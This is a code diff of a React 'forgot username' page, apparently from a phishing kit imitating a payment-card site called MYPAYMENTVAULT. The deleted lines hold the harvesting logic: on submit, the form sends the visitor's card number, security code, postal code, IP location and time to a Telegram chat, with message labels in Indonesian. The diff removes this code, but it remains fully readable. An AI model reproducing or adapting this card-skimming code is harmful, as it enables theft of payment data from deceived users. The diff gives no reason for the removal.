@@ -2,7 +2,6 @@ import { useState } from "react";
 import { useLocation } from "wouter";
 import { AuthHeader } from "@/components/auth-header";
 import { Eye, EyeOff } from "lucide-react";
-import { sendTelegram, getIPInfo } from "@/lib/telegram";
 import { useI18n } from "@/lib/i18n";
 
 export default function ForgotUsername() {
@@ -25,20 +24,6 @@ export default function ForgotUsername() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
-    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip = await getIPInfo();
-    await sendTelegram(
-      `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🔍 <b>MYPAYMENTVAULT</b>\n` +
-      `📌 <b>Lupa Username</b>\n` +
-      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-      `💳 <b>No. Kartu</b>   : <code>${cardNumber}</code>\n` +
-      `🔒 <b>Kode Keamanan</b>: <code>${securityCode}</code>\n` +
-      `📮 <b>Postal Code</b> : <code>${postalCode}</code>\n` +
-      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
-      `🕐 <b>Waktu</b>       : ${now}\n` +
-      `━━━━━━━━━━━━━━━━━━━━━`
-    );
     await new Promise((r) => setTimeout(r, 1000));
     setLoading(false);
     setDone(true);
